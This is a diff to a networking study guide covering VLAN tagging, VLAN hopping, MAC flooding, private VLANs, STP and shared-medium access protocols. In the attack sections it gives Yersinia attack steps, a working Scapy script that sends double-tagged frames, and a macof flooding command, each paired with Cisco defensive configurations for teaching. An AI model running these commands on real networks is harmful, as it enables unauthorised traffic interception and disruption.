+              ├───────┬─────┬───────┬────────┤
+              │ TPID  │ PCP │ DEI   │ VID    │
+              │ 0x8100│ 3bit│ 1bit  │ 12bit  │
+              │       │ QoS │ Drop  │ VLAN ID│
+              │       │     │ Elig  │ 0-4095 │
+              └───────┴─────┴───────┴────────┘
+```
+
+**VLAN Hopping Attack #1: Switch Spoofing**
+
+**What It Is:**
+Attacker's device negotiates a trunk link with the switch, gaining access to all VLANs.
+
+**Attack Diagram:**
+```
+Normal State:
+┌───────────────┐       Access Port        ┌─────────────┐
+│   Attacker    │ ───────────────────────> │   Switch    │
+│   (User PC)   │       VLAN 10 only       │             │
+└───────────────┘                          └─────────────┘
+
+Switch Spoofing Attack:
+┌───────────────┐       Trunk Port!        ┌─────────────┐
+│   Attacker    │ ════════════════════════>│   Switch    │
+│ (Spoofs SW)   │    ALL VLANs (10,20,30)  │ DTP Enabled │
+└───────────────┘                          └─────────────┘
+     │
+     │ DTP negotiates trunk
+     │ Attacker now sees all VLAN traffic!
+```
+
+**How It Works:**
+1. Switch has DTP (Dynamic Trunking Protocol) enabled on port
+2. Attacker sends DTP packets pretending to be a switch
+3. Switch negotiates trunk link
+4. Attacker receives tagged traffic from ALL VLANs
+
+**Tools:**
+```bash
+# Using Yersinia (DTP attack)
+sudo yersinia -G  # GUI mode
+# Select DTP tab > "enabling trunking" > Launch attack
+
+# Using Scapy
+from scapy.all import *
+# Craft DTP packets to negotiate trunk
+```
+
+**Defense:**
+```
+! Disable DTP on all access ports
+interface range GigabitEthernet0/1-24
+  switchport mode access
+  switchport nonegotiate
+
+! Explicitly set trunk ports
+interface GigabitEthernet0/48
+  switchport mode trunk
+  switchport nonegotiate
+```
+
+**VLAN Hopping Attack #2: Double Tagging**
+
+**What It Is:**
+Attacker sends frames with two 802.1Q tags. Switch strips outer tag (native VLAN), inner tag reaches target VLAN.
+
+**Attack Diagram:**
+```
+┌────────────┐                  ┌─────────┐                  ┌─────────┐
+│  Attacker  │ ───────────────> │ Switch  │ ───────────────> │ Switch  │
+│  VLAN 10   │                  │    A    │     Trunk        │    B    │
+│            │                  │         │                  │         │
+└────────────┘                  └─────────┘                  └─────────┘
+      │                              │                            │
+      │ Frame:                       │ After Strip:               │
+      │ [Outer: VLAN 10]             │ [Inner: VLAN 20]           ▼
+      │ [Inner: VLAN 20]             │ (Native VLAN stripped)  ┌─────────┐
+      │ [Payload]                    │                         │ Victim  │
+      │                              │                         │ VLAN 20 │
+      └──────────────────────────────┴────────────────────────>│         │
+                                                               └─────────┘
+                                   Packet reaches VLAN 20!
+```
+
+**Requirements:**
+- Attacker must be on native VLAN (or trunk's native VLAN)
+- Native VLAN must be same on both switches
+- Attack is one-way only (can't get responses)
+
+**Attack Implementation:**
+```bash
+# Using Scapy
+from scapy.all import *
+
+# Create double-tagged frame
+# Outer tag: Native VLAN (stripped by first switch)
+# Inner tag: Target VLAN
+double_tagged = Ether(dst="ff:ff:ff:ff:ff:ff")/\
+                Dot1Q(vlan=1)/\
+                Dot1Q(vlan=20)/\
+                IP(dst="192.168.20.1")/\
+                ICMP()
+
+sendp(double_tagged, iface="eth0")
+
+# Using Yersinia
+sudo yersinia -G
+# Select 802.1Q tab > Double Tagging attack
+```
+
+**Defense:**
+```
+! Never use VLAN 1 as native VLAN
+! Create unused VLAN for native
+vlan 999
+  name NATIVE_UNUSED
+
+! Set unused VLAN as native on all trunks
+interface GigabitEthernet0/48
+  switchport trunk native vlan 999
+
+! Or tag native VLAN (Cisco)
+vlan dot1q tag native
+
+! Remove native VLAN from allowed list
+interface GigabitEthernet0/48
+  switchport trunk allowed vlan 10,20,30
+```
+
+**Private VLANs (PVLAN) for Isolation:**
+
+Isolate hosts within same VLAN while allowing upstream access.
+
+```
+┌──────────────────────────────────────────────────────────────────┐
+│                    Primary VLAN 100                               │
+│  ┌──────────────────┐    ┌──────────────────┐                    │
+│  │ Isolated VLAN    │    │ Community VLAN   │                    │
+│  │ (no peer talk)   │    │ (talk to peers)  │                    │
+│  │                  │    │                  │                    │
+│  │  [Host A]  [Host B]   │  [Host C]  [Host D]                   │
+│  │     │        │   │    │     │        │   │                    │
+│  │     X────────X   │    │     ✓────────✓   │                    │
+│  │   Can't talk!    │    │   Can talk!      │                    │
+│  └────────│─────────┘    └────────│─────────┘                    │
+│           │                       │                              │
+│           └───────────┬───────────┘                              │
+│                       │                                          │
+│                       ▼                                          │
+│             ┌─────────────────┐                                  │
+│             │ Promiscuous Port│  ← Gateway/Router                │
+│             │ (talks to all)  │  ← Can reach all hosts           │
+│             └─────────────────┘                                  │
+└──────────────────────────────────────────────────────────────────┘
+```
+
+```
+! Configure Private VLAN
+vlan 100
+  private-vlan primary
+vlan 101
+  private-vlan isolated
+vlan 102
+  private-vlan community
+
+vlan 100
+  private-vlan association 101,102
+
+! Configure ports
+interface GigabitEthernet0/1
+  switchport mode private-vlan host
+  switchport private-vlan host-association 100 101
+
+interface GigabitEthernet0/48
+  switchport mode private-vlan promiscuous
+  switchport private-vlan mapping 100 101,102
+```
+
+**CAM Table Overflow (MAC Flooding):**
+
+Flood switch with fake MACs to overflow CAM table, forcing switch to flood all frames.
+
+```bash
+# Using macof (dsniff)
+sudo macof -i eth0 -n 100000
+
+# Using Yersinia
+sudo yersinia -G
+# Select CAM overflow attack
+
+# Switch behavior:
+# - CAM table fills up
+# - Unknown unicast frames flooded to all ports
+# - Attacker sees all traffic (like a hub)
+```
+
+**Defense:**
+```
+! Port security limits MACs per port
+interface GigabitEthernet0/5
+  switchport port-security
+  switchport port-security maximum 2
+  switchport port-security violation shutdown
+  switchport port-security aging time 5
+```
+
+**VLAN Security Best Practices Summary:**
+
+| Defense | Configuration |
+|---------|---------------|
+| **Disable DTP** | `switchport nonegotiate` on all ports |
+| **Explicit Mode** | `switchport mode access` or `trunk` |
+| **Change Native VLAN** | Use unused VLAN (not VLAN 1) |
+| **Prune VLANs** | Only allow needed VLANs on trunks |
+| **Port Security** | Limit MAC addresses per port |
+| **BPDU Guard** | Protect against rogue switches |
+| **Private VLANs** | Isolate hosts in same subnet |
+| **Unused Ports** | Assign to dead VLAN, shut down |
+| **802.1X** | Authenticate before VLAN assignment |
+
+**Collision vs Broadcast Domain Summary**
+| Device | Collision Domains | Broadcast Domains |
+| --- | --- | --- |
+| **Hub** | 1 (entire device) | 1 (entire device) |
+| **Switch** | N (1 per port) | 1 (entire device) |
+| **Router** | N (1 per interface) | N (1 per interface) |
+
+**Circle Technique (Visual Method)**
+- **Collision domains:** Circle each switch/router port (hub = one big circle for all ports)
+- **Broadcast domains:** Circle until you hit a router boundary
+
+##### **Switch Architecture & Security**
+
+> 📖 *For detailed switch and Layer 2 security coverage, see [Section 5.3 Layer 2 Devices](#53-layer-2-data-link-layer-devices).*
+
+**CAM Tables**
+- Switches learn MAC‑to‑port mappings by observing source MACs. Entries expire with aging timers.
+- **Learning vs Flooding:** Unknown unicast frames are flooded until learned; stability depends on consistent MAC learning.
+
+**CAM Table Flooding (Conceptual)**
+- Excess MAC entries can overwhelm the table, forcing the switch to flood unknown unicast frames.
+
+**Port Security**
+- Limits MAC addresses per port, enables sticky learning, and defines violation actions (protect, restrict, shutdown).
+
+**Spanning Tree Protocol (STP)**
+- Prevents loops in Layer 2 topologies through root bridge election and port roles/states.
+- **BPDU Guard/Filter/Root Guard/Loop Guard** harden STP against miswiring and rogue devices.
+- **Topology Change Notifications:** MAC tables are flushed to prevent stale paths after topology shifts.
+- **Path Cost:** Lower cost links are preferred; cost derives from link speed.
+
+##### **Security Features**
+
+**DHCP Snooping**
+- Builds a trusted mapping of IP/MAC/port from DHCP transactions.
+
+**Dynamic ARP Inspection (DAI)**
+- Validates ARP traffic against snooping bindings to prevent spoofing.
+
+**IP Source Guard (IPSG)**
+- Filters traffic that does not match valid IP/MAC/port bindings.
+- **Trusted vs Untrusted Ports:** Defines which ports can send DHCP responses and which are client‑only.
+- **Binding Table Dependency:** IPSG accuracy relies on DHCP snooping bindings.
+
+##### **Rapid PVST+ (RSTP) Details**
+
+**Root Bridge Election**
+- Lowest bridge ID wins; configured with priority values (0–61440 in 4096 increments).
+
+**Port Roles & States**
+- Roles: Root, Designated, Alternate, Backup.
+- States: Discarding, Learning, Forwarding (RSTP converges faster than classic STP).
+
+**PortFast and Guards**
+- PortFast reduces edge‑port delay; BPDU Guard disables port upon unexpected BPDUs. Root Guard and Loop Guard prevent topology takeovers or unidirectional failures.
+
+##### **Network Scope & Physical Reach**
+
+**PAN, LAN, WLAN, MAN, WAN**
+- Each scope defines distance, ownership, and technology mix; this impacts performance, security boundaries, and troubleshooting methods.
+
+##### **Protocols & Analysis**
+
+**STP/RSTP/MST**
+- MST groups VLANs for scalable spanning tree instances.
+
+**Link Aggregation (802.3ad)**
+- Combines multiple physical links into a single logical channel for redundancy and bandwidth.
+- **Hashing Behavior:** Flow distribution depends on selected hash fields; uneven flows can cause imbalance.
+- **Consistency Requirements:** Member links must match speed/duplex to avoid instability.
+
+**LLDP/CDP**
+- Neighbor discovery protocols used for topology mapping and inventory. They can leak device details if left enabled on edge ports.
+
+**Packet Capture & Analysis**
+- Layer 2 analysis focuses on frame headers, VLAN tags, and MAC behaviors.
+- **Indicators:** Broadcast storms, unexpected VLAN tags, or excessive ARP traffic often signal misconfiguration.
+- **SPAN/Port Mirroring:** Common method for capturing switch traffic without disrupting flows.
+
+##### **Cisco Discovery & Wireless Architecture**
+
+**CDP vs LLDP**
+- CDP is Cisco‑only; LLDP is multi‑vendor. LLDP‑MED adds VoIP metadata.
+
+**EtherChannel Details**
+- LACP active/passive modes; PAgP desirable/auto. Hashing determines load distribution.
+
+**Cisco Wireless**
+- Autonomous APs run standalone. Lightweight APs tunnel CAPWAP to WLC. FlexConnect allows local switching with centralized control.
+
 ---
 
 ##### **Sublayers: LLC vs MAC**
 
 **Two Sublayers**
-- **LLC (Logical Link Control - IEEE 802.2):** Flow control, error control, multiplexing.
+- **LLC (Logical Link Control - IEEE 802.2):** Flow control, error control, multiplexing (logical services to Layer 3).
 - **MAC (Media Access Control - IEEE 802.3/802.11):** Physical addressing, media access control, frame delimiters.
 
 **Why Sub‑Layers?** Separate **software‑facing** control tasks from **hardware‑facing** media access tasks.
@@ -2059,38 +2939,229 @@ Process: ENCAPSULATION (↓)  |  DE-ENCAPSULATION (↑)
 **Flow:** Network Layer → LLC → MAC → Physical Layer
 
 **LLC (Upper Sub‑Layer)**
-- **Multiplexing & de‑multiplexing** of upper‑layer protocols
-- **Flow control**
-- **Error control**
-- **Multi‑point communication** coordination
+- **Multiplexing** over MAC & **de‑multiplexing** while receiving (maps Layer 3 protocols to a single MAC interface)
+- **Service interface** to the Network Layer (uniform services regardless of Ethernet, Wi‑Fi, etc.)
+- **Flow control** (prevents fast senders from overwhelming slow receivers)
+- **Error control** (acknowledgments/retransmissions in legacy/optional LLC types)
+- **Link management** (establish, maintain, and release logical links)
+- **Multi‑point communication** coordination (shared medium awareness)
+- **Tracks acknowledgements** while MAC handles framing and media access
+
+- **LLC Service Types (conceptual):**
+  - **Type 1:** Unacknowledged connectionless (best effort)
+  - **Type 2:** Connection‑oriented (reliable, acknowledged)
+  - **Type 3:** Acknowledged connectionless (less common)
+- **Protocol ID / SAPs:** Uses Service Access Points (SAPs) to identify upper‑layer protocols
 
 **MAC (Lower Sub‑Layer)**
-- **Encapsulation (framing)**
-- **Physical addressing** (Src/Dst MAC)
+- **Encapsulation (framing)** (builds Ethernet/802.11 frames with header/trailer)
+- **Physical addressing** (Src/Dst MAC, unicast/multicast/broadcast)
 - **Media access control** (CSMA/CD, CSMA/CA, ALOHA, Token Passing)
-- **Collision resolution** on shared media
+- **Collision resolution** on shared media (backoff and retransmit)
+- **Frame delimiting & synchronization** (start/end markers, preamble)
+- **Error detection** using **FCS/CRC** in the frame trailer
+- **MAC filtering** (accepts only frames for local MAC, multicast, or broadcast)
+- **Link‑layer QoS hints** (priority tagging like 802.1p within VLAN tags)
+- **Hardware‑centric tasks:** implemented in NIC/switch silicon for speed
 
 ---
 
 ##### **Access Control Protocols (Shared Medium)**
 
-**Core Problem:** Simultaneous transmissions on shared media cause **collisions**. Access control decides **who transmits and when**.
+**Core Problem:** When multiple devices share a single communication channel (like early Ethernet or Wi-Fi), simultaneous transmissions cause **collisions** — signals overlap and corrupt each other. Access control protocols decide **who transmits and when** to minimize or eliminate collisions.
+
+**Why This Matters for Cybersecurity:**
+- Understanding access control reveals attack surfaces (jamming, collision-based DoS)
+- Wi-Fi security depends on CSMA/CA behavior
+- Legacy systems using older protocols may have unique vulnerabilities
+- Network performance issues often trace back to access control problems
+
+---
 
 **A) Random Access (Contention‑Based)**
-- **ALOHA:** Send anytime; high collision rate.
-- **CSMA:** Listen before talk.
-- **CSMA/CD:** Collision detection (wired Ethernet).
-- **CSMA/CA:** Collision avoidance (Wi‑Fi).
+
+In random access, any station can transmit whenever it wants — there's no central coordinator. This creates potential for collisions, so protocols include mechanisms to detect/avoid them.
+
+**1. ALOHA (Pure & Slotted)**
+- **Origin:** University of Hawaii (1970s) for connecting campuses via radio
+- **Mechanism:** Transmit immediately without checking if channel is busy
+- **Collision Handling:** Wait for ACK; if no ACK arrives, assume collision and retry after random delay
+- **Efficiency:** 
+  - Pure ALOHA: ~18.4% (vulnerable time = 2× frame transmission time)
+  - Slotted ALOHA: ~36.8% (transmissions only at slot boundaries)
+- **Use Today:** Basis for satellite communication, RFID systems
+
+**2. CSMA (Carrier Sense Multiple Access)**
+- **Improvement over ALOHA:** Listen before transmitting ("sense the carrier")
+- **Variants:**
+  - **1-Persistent:** If busy, wait and transmit immediately when idle (aggressive)
+  - **Non-Persistent:** If busy, wait random time before sensing again (polite)
+  - **p-Persistent:** If idle, transmit with probability p (balanced)
+- **Problem:** Doesn't eliminate collisions during propagation delay window
+
+**3. CSMA/CD (Collision Detection) — Wired Ethernet**
+- **How it works:** 
+  1. Listen to channel (carrier sense)
+  2. If idle, begin transmitting
+  3. While transmitting, monitor for collision
+  4. If collision detected: stop, send 48-bit jam signal, wait (backoff), retry
+- **Binary Exponential Backoff:** After collision $n$, wait random time from $[0, 2^n - 1]$ slot times
+- **Why 64-byte minimum frame?** Ensures sender is still transmitting when collision signal returns (based on max cable length)
+- **Status:** Obsolete in modern switched Ethernet (full-duplex = no collisions)
+
+**4. CSMA/CA (Collision Avoidance) — Wi-Fi (802.11)**
+- **Why not CD?** Wireless stations can't detect collisions while transmitting (signal overwhelms receiver)
+- **How it works:**
+  1. Sense channel; if busy, defer
+  2. If idle for DIFS (DCF Inter-Frame Space), start backoff timer
+  3. Decrement timer only when channel is idle
+  4. When timer = 0, transmit
+  5. Wait for ACK; if no ACK, assume collision, double backoff window
+- **RTS/CTS (Optional):** Sender sends Request-to-Send; receiver replies Clear-to-Send; reserves channel (solves hidden node problem)
+- **Hidden Node Problem:** Station A can hear AP, Station B can hear AP, but A and B can't hear each other → collisions at AP
+
+```
+Hidden Node Problem:
+   [A] ←───→ [AP] ←───→ [B]
+    |                     |
+    └── A and B can't ────┘
+        hear each other
+```
+
+**5. Collision Resolution (What Happens After Collision)**
+
+After a collision occurs, stations must decide **when to retry** — this is collision resolution.
+
+- **Binary Exponential Backoff (BEB):** Primary method used by Ethernet & Wi-Fi
+  - After collision #$n$, wait random time from $[0, 2^n - 1]$ slot times
+  - Window doubles with each collision (adapts to congestion)
+  - Max retries: 16 (Ethernet), 4-7 (Wi-Fi)
+- **Jam Signal:** 48-bit signal sent to ensure all stations detect collision (CSMA/CD)
+- **ACK-based Detection:** No ACK received → assume collision (CSMA/CA, ALOHA)
+
+> 📖 *For detailed collision resolution coverage including backoff algorithms, Wi-Fi contention windows, security implications, and troubleshooting, see [Collision Resolution Deep Dive](#collision-resolution-deep-dive) below.*
+
+---
 
 **B) Controlled Access**
-- **Reservation:** Book time slots before sending.
-- **Polling:** Central controller asks nodes in turn.
-- **Token Passing:** Transmit only with the token (Token Ring/Token Bus).
+
+In controlled access, a mechanism ensures only one station transmits at a time — no collisions by design, but overhead from coordination.
+
+**1. Reservation**
+- **Mechanism:** Time is divided into slots; stations reserve future slots in a reservation frame
+- **How it works:**
+  1. Mini-slots at start of each frame for reservations
+  2. Stations broadcast which slot they want
+  3. Data transmission happens in reserved order
+- **Advantage:** No collisions during data transmission
+- **Disadvantage:** Wasted time if reserved slots go unused
+
+**2. Polling**
+- **Mechanism:** Central controller (primary) asks each station (secondary) in turn: "Do you have data?"
+- **How it works:**
+  1. Controller sends poll to Station 1
+  2. Station 1 responds with data or "nothing to send"
+  3. Controller polls Station 2, and so on
+  4. Cycle repeats
+- **Variants:**
+  - **Roll-Call Polling:** Poll in fixed order
+  - **Hub Polling:** Token passed between stations (decentralized)
+- **Advantage:** Fair, predictable, no collisions
+- **Disadvantage:** Polling overhead; latency if you're late in the list
+- **Use Cases:** Mainframe-terminal communication, industrial SCADA systems
+
+**3. Token Passing**
+- **Mechanism:** Special frame (token) circulates; only token holder can transmit
+- **How it works:**
+  1. Token circulates around logical ring
+  2. Station wanting to send captures token
+  3. Transmits data frame(s)
+  4. Releases token when done (or after time limit)
+  5. Next station gets token
+- **Token Ring (IEEE 802.5):** Physical ring topology; largely obsolete
+- **Token Bus (IEEE 802.4):** Bus topology with logical ring; used in manufacturing
+- **FDDI:** Fiber Distributed Data Interface; dual counter-rotating rings; 100 Mbps
+- **Advantage:** Deterministic timing (guaranteed max wait time)
+- **Disadvantage:** Token loss requires recovery; single point of failure without redundancy
+
+```
+Token Ring Operation:
+     ┌──── [A] ◄────┐
+     │              │
+     ▼              │
+    [D]    TOKEN   [B]
+     │      ───►    │
+     │              │
+     └────► [C] ────┘
+```
+
+---
 
 **C) Channelization (Multiplexing)**
-- **FDMA:** Split by frequency (guard bands).
-- **TDMA:** Split by time slots.
-- **CDMA:** Split by orthogonal codes.
+
+Instead of time-sharing one channel, divide the channel into separate sub-channels. Each station gets dedicated capacity — no collisions possible.
+
+**1. FDMA (Frequency Division Multiple Access)**
+- **Mechanism:** Divide frequency spectrum into bands; each station gets a band
+- **Guard Bands:** Unused frequencies between channels prevent interference
+- **Example:** Traditional radio/TV broadcasting, early cellular (1G AMPS)
+- **Advantage:** Simple, continuous transmission possible
+- **Disadvantage:** Wasted capacity if station has nothing to send; guard bands reduce efficiency
+
+```
+FDMA Spectrum Division:
+|--Band 1--|guard|--Band 2--|guard|--Band 3--|guard|--Band 4--|
+   User A          User B          User C          User D
+```
+
+**2. TDMA (Time Division Multiple Access)**
+- **Mechanism:** Divide time into frames; each frame has slots; each station gets slot(s)
+- **Synchronization:** All stations must be time-synchronized
+- **Example:** GSM cellular (2G), satellite communication
+- **Advantage:** Flexible allocation (more slots = more bandwidth)
+- **Disadvantage:** Synchronization overhead; wasted slots if station has nothing to send
+
+```
+TDMA Frame Structure:
+|--Slot 1--|--Slot 2--|--Slot 3--|--Slot 4--|--Slot 1--|--Slot 2--|...
+   User A     User B     User C     User D     User A     User B
+   Frame 1                                     Frame 2
+```
+
+**3. CDMA (Code Division Multiple Access)**
+- **Mechanism:** All stations transmit simultaneously on same frequency; each uses unique orthogonal code
+- **Spreading:** Data multiplied by station's code; spreads signal across bandwidth
+- **Despreading:** Receiver multiplies by same code to extract original data
+- **Orthogonal Codes:** Codes designed so they cancel out when multiplied (cross-correlation = 0)
+- **Example:** 3G cellular (CDMA2000, WCDMA), GPS
+- **Advantage:** No coordination needed; graceful degradation under load; inherent security (code = key)
+- **Disadvantage:** Complex receivers; near-far problem (strong signals overwhelm weak)
+
+```
+CDMA Principle:
+Station A: Data × Code_A → Spread_A ─┐
+Station B: Data × Code_B → Spread_B ─┼──► Combined Signal
+Station C: Data × Code_C → Spread_C ─┘
+                                      │
+Receiver (wants A): Combined × Code_A → Original Data_A
+                   (B and C cancel out due to orthogonality)
+```
+
+---
+
+**Comparison Table: Access Control Protocols**
+
+| Protocol | Type | Collision | Efficiency | Latency | Use Case |
+|----------|------|-----------|------------|---------|----------|
+| Pure ALOHA | Random | High | ~18% | Variable | Satellite, RFID |
+| Slotted ALOHA | Random | Medium | ~37% | Variable | Satellite |
+| CSMA/CD | Random | Medium | ~90% | Variable | Legacy Ethernet |
+| CSMA/CA | Random | Low | ~70% | Variable | Wi-Fi |
+| Polling | Controlled | None | High | Predictable | SCADA, mainframes |
+| Token Passing | Controlled | None | High | Bounded | Industrial, legacy |
+| FDMA | Channelization | None | Medium | Low | Radio, 1G cellular |
+| TDMA | Channelization | None | High | Bounded | 2G cellular, satellite |
+| CDMA | Channelization | None | High | Low | 3G cellular, GPS |
 
 ---
 
@@ -2098,45 +3169,217 @@ Process: ENCAPSULATION (↓)  |  DE-ENCAPSULATION (↑)
 
 **Context & Why It Matters**
 - Used in early Ethernet with **bus topology** (shared medium).
-- Mostly obsolete in switched Ethernet but critical for collision physics.
+- Mostly obsolete in switched Ethernet but critical for understanding collision physics.
 
 **Name Breakdown**
 - **CS:** Carrier sense (listen first)
 - **MA:** Multiple access (shared medium)
-- **CD:** Collision detection
+- **CD:** Collision detection (detect while transmitting)
 
-**Propagation Delay & Vulnerable Time**
-- **Propagation time $(T_p)$:** Time for a signal to travel end‑to‑end.
-- During $T_p$, another station may not yet sense the signal → collision.
+**How It Works**
+- Stations monitor the medium while transmitting.
+- If collision detected → stop, send jam signal, backoff, retry.
+
+**Key Timing Concepts**
+| Parameter | Description |
+|-----------|-------------|
+| **Propagation time $(T_p)$** | Time for signal to travel end-to-end |
+| **Transmission time $(T_t)$** | Time to send entire frame |
+| **Slot time** | $2 \times T_p$ (round-trip time) |
 
 **Golden Equation**
-$$
-T_t \ge 2 \times T_p
-$$
+$$T_t \ge 2 \times T_p$$
 Sender must still be transmitting when collision signal returns.
 
 **Algorithm Steps**
 1. Sense the medium.
 2. If idle, transmit; if busy, wait.
 3. Transmit and monitor simultaneously.
-4. On collision: stop, send jam signal.
+4. On collision: stop, send 48-bit jam signal.
 5. Apply **binary exponential backoff** and retry.
+
+**Why 64-Byte Minimum Frame?**
+- Ensures sender is still transmitting when collision signal returns
+- Based on maximum cable length (2500m for 10BASE5)
+
+**Security Concerns**
+- **MAC flooding:** Overflow CAM table → switch acts like hub
+- **Collision-based DoS:** Jam signal abuse on legacy networks
+- **Eavesdropping:** Hub/shared media exposes all traffic
+
+---
+
+##### **CSMA/CA (Carrier Sense Multiple Access with Collision Avoidance)**
+
+**Context & Why It Matters**
+- Used in **Wi-Fi (IEEE 802.11)** wireless networks.
+- Wireless stations can't detect collisions while transmitting.
+- Must **avoid** collisions rather than detect them.
+
+**Name Breakdown**
+- **CS:** Carrier sense (listen first)
+- **MA:** Multiple access (shared medium)
+- **CA:** Collision avoidance (prevent before it happens)
+
+**How It Works**
+- Sense channel, wait for idle period (DIFS), then random backoff.
+- Transmit only when backoff reaches zero.
+- Rely on ACK to confirm success.
+
+**Key Timing Parameters**
+| Parameter | Purpose | Typical Value |
+|-----------|---------|---------------|
+| **DIFS** | Wait before transmitting | 50 μs (802.11a/g) |
+| **SIFS** | Short gap for ACK/CTS | 10 μs (802.11a/g) |
+| **Slot Time** | Backoff unit | 9 μs (802.11a/g/n) |
+
+**Algorithm Steps**
+1. Sense channel; if busy, defer.
+2. If idle for **DIFS**, start random backoff timer.
+3. Decrement timer only when channel is idle.
+4. When timer = 0, transmit frame.
+5. Wait for **ACK** (after SIFS).
+6. No ACK? Double contention window, retry.
+
+**Why Not Collision Detection?**
+- **Near-far problem:** Own transmission drowns out other signals
+- **Half-duplex radios:** Can't transmit and receive simultaneously
+- **Hidden node issue:** Stations may not hear each other
+
+**RTS/CTS Mechanism (Optional)**
+```
+Sender ──RTS──> AP ──CTS──> All stations hear "channel reserved"
+       <──CTS── AP
+       ──DATA─> AP
+       <──ACK── AP
+```
+
+**Hidden Node Problem**
+```
+   [A] ←───→ [AP] ←───→ [B]
+    |                     |
+    └── A and B can't ────┘
+        hear each other
+```
+
+**Security Concerns**
+- **Deauthentication attacks:** Force stations off network
+- **Channel jamming:** Continuous transmission blocks all access
+- **NAV manipulation:** Fake RTS/CTS to reserve channel unfairly
+
+---
+
+##### **Collision Resolution (What Happens After Collision)**
+
+**Context & Why It Matters**
+- After collision is detected (CSMA/CD) or assumed (CSMA/CA, ALOHA).
+- Stations must decide **when to retry** without colliding again.
+- Fair and efficient resolution prevents starvation and congestion.
+
+**Name Breakdown**
+- **Collision:** Two or more simultaneous transmissions corrupt each other
+- **Resolution:** Algorithm to determine retry timing
+
+**How It Works**
+- Wait a random time before retrying.
+- Random window grows with each collision (exponential backoff).
+- After max retries, discard frame and report error.
+
+**Key Timing Parameters**
+| Parameter | Ethernet | Wi-Fi |
+|-----------|----------|-------|
+| **Initial window** | 2 slots | CWmin (15 or 31) |
+| **Max window** | 1024 slots | CWmax (1023) |
+| **Max retries** | 16 | 4-7 |
+| **Slot time** | 51.2 μs (10M) | 9 μs (802.11a/g/n) |
+
+**Binary Exponential Backoff Algorithm**
+1. After collision #$n$: wait random time from $[0, 2^n - 1]$ slots
+2. Window doubles each collision → adapts to congestion
+3. Max retries exceeded → discard frame, report error
+
+```
+Collision #  |  Window      |  Wait Range
+-----------------------------------------
+    1        |  2           |  0-1 slots
+    3        |  8           |  0-7 slots
+   10        |  1024        |  0-1023 slots (Ethernet max)
+```
+
+**Key Variants**
+| Method | Used By | Key Feature |
+|--------|---------|-------------|
+| **TBEB** | IEEE 802.3 | Caps at 1024, max 16 retries |
+| **CW** | Wi-Fi 802.11 | CWmin/CWmax, QoS-aware |
+| **p-Persistent** | ALOHA | Transmit with probability $p$ |
+
+**Security Concerns**
+- **Backoff manipulation:** Attacker always picks 0 → unfair advantage
+- **Collision DoS:** Force victims into exponential backoff
+- **Timing analysis:** Backoff patterns leak traffic info
 
 ---
 
 ##### **ALOHA (Random Access Protocol)**
 
-**Overview**
-- Originated for radio links in Hawaii.
-- **Transmit immediately** (no carrier sensing).
+**Context & Why It Matters**
+- First random access protocol (University of Hawaii, 1970s).
+- Foundation for all modern contention-based protocols.
+- Used in satellite communication and RFID systems today.
 
-**Operation**
-- Success confirmed by **ACK**.
-- If no ACK → collision assumed → random backoff.
+**Name Breakdown**
+- **ALOHA:** Hawaiian greeting ("hello") — simple, informal approach
+- No carrier sensing — just transmit and hope for the best
 
-**Types**
-- **Pure ALOHA:** Any overlap destroys frames; vulnerable time $2 \times$ frame time; ~18.4% efficiency.
-- **Slotted ALOHA:** Start only at slot boundaries; collisions only within same slot; ~36.8% efficiency.
+**How It Works**
+- Transmit immediately without checking if channel is busy.
+- Wait for ACK; if no ACK → assume collision → random backoff → retry.
+
+**Key Timing Parameters**
+| Parameter | Pure ALOHA | Slotted ALOHA |
+|-----------|------------|---------------|
+| **Vulnerable time** | $2 \times T_{frame}$ | $T_{frame}$ |
+| **Max efficiency** | ~18.4% | ~36.8% |
+| **Transmission start** | Anytime | Slot boundaries only |
+
+**Types of ALOHA**
+
+**Pure ALOHA:**
+- Transmit anytime → any overlap destroys both frames
+- Vulnerable time = $2 \times$ frame transmission time
+- Efficiency: $S = G \cdot e^{-2G}$ → max ~18.4% at $G = 0.5$
+
+```
+Time ─────────────────────────────────────────>
+      [Frame A        ]
+            [Frame B      ]  ← Overlap = collision!
+                  [Frame C    ]
+```
+
+**Slotted ALOHA:**
+- Time divided into slots; transmit only at slot boundaries
+- Collisions only within same slot → vulnerable time halved
+- Efficiency: $S = G \cdot e^{-G}$ → max ~36.8% at $G = 1$
+
+```
+Time ──|────|────|────|────|────|────|────>
+       [A  ]     [B  ][C  ]     [D  ]
+              Slot boundaries
+```
+
+**Algorithm Steps**
+1. Generate frame to send.
+2. Transmit immediately (Pure) or at next slot (Slotted).
+3. Wait for ACK within timeout.
+4. ACK received? Success!
+5. No ACK? Wait random time, retry (up to max attempts).
+
+**Security Concerns**
+- **Jamming:** Easy to disrupt — no collision avoidance
+- **Replay attacks:** Retransmissions can be exploited
+- **DoS:** Flood channel → efficiency drops to near zero
+
+---
 
 ---
 
@@ -2166,132 +3409,8 @@ Sender must still be transmitting when collision signal returns.
 
 ---
 
-##### **Ethernet Frame Format (IEEE 802.3)**
-
-**Frame Structure (Example)**
-```
-[Preamble|Dest MAC|Src MAC|Type/Length|Payload|FCS]
-  7 bytes  6 bytes  6 bytes   2 bytes  46-1500B 4 bytes
-```
-
-**Overview**
-- **Standard:** IEEE 802.3
-- **OSI Layer:** Data Link (Layer 2)
-- **Sublayers:** LLC (upper), MAC (lower)
-
-**Ethernet Frame Fields**
-
-| Field | Size | Description & Function |
-| --- | --- | --- |
-| Preamble | 7 bytes | Alternating 1s and 0s (101010...) for clock synchronization. |
-| SFD | 1 byte | 10101011 pattern; marks frame start. |
-| Destination Address | 6 bytes | Receiver MAC address. |
-| Source Address | 6 bytes | Sender MAC address (unicast). |
-| Length | 2 bytes | Payload size in bytes (max 1500). |
-| Data / Payload | 46–1500 bytes | Encapsulated Layer 3 packet; padded if under 46 bytes. |
-| CRC (FCS) | 4 bytes | Error check. |
-
-**Frame Size Constraints**
-- **Minimum:** 64 bytes
-- **Maximum:** 1518 bytes
-
----
-
-##### **MAC Address (Physical Address)**
-
-**What it is**
-- Unique NIC identifier used for local delivery.
-- Also called **Physical**, **Hardware**, or **Link‑Layer** address.
-- **Length:** 48 bits (6 bytes), typically burned into hardware.
-
-**Format & Structure**
-- Hex format: **00:1A:2B:3C:4D:5E**
-- **OUI (first 24 bits):** Manufacturer ID (IEEE assigned)
-- **NIC‑specific (last 24 bits):** Device identifier
-
-**Why MAC vs IP?**
-- **IP:** End‑to‑end routing
-- **MAC:** Hop‑to‑hop delivery
-
-**Address Types**
-- **Unicast:** LSB of first byte = 0
-- **Multicast:** LSB of first byte = 1
-- **Broadcast:** **FF:FF:FF:FF:FF:FF**
-
